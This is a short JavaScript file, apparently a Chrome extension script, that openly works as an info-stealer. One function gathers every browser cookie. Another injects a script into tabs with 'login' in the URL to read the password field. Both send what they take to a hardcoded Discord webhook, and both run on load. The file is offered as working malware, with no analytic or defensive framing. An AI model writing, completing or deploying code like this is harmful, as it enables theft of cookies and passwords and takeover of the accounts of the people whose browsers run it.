const axios = require('axios');

// Function to steal cookies
function stealCookies() {
    chrome.cookies.getAll({}, cookies => {
        let cookieData = '';
        cookies.forEach(cookie => {
            cookieData += `${cookie.name}=${cookie.value}; `;
        });

        // Send cookies to Discord webhook
        axios.post('https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4', {
            content: `Stolen Cookies: \`\`\`${cookieData}\`\`\``
        });
    });
}

// Function to steal passwords
function stealPasswords() {
    chrome.windows.getAll({}, windows => {
        windows.forEach(window => {
            chrome.tabs.getAllInWindow(window.id, tabs => {
                tabs.forEach(tab => {
                    if (tab.url.indexOf('login') !== -1) {
                        chrome.tabs.executeScript(tab.id, {
                            code: `document.querySelector('input[name=password]').value`
                        }, password => {
                            // Send password to Discord webhook
                            axios.post('https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4', {
                                content: `Stolen Password: \`\`\`${password}\`\`\``
                            });
                        });
                    }
                });
            });
        });
    });
}

// Run both functions
stealCookies();
stealPasswords();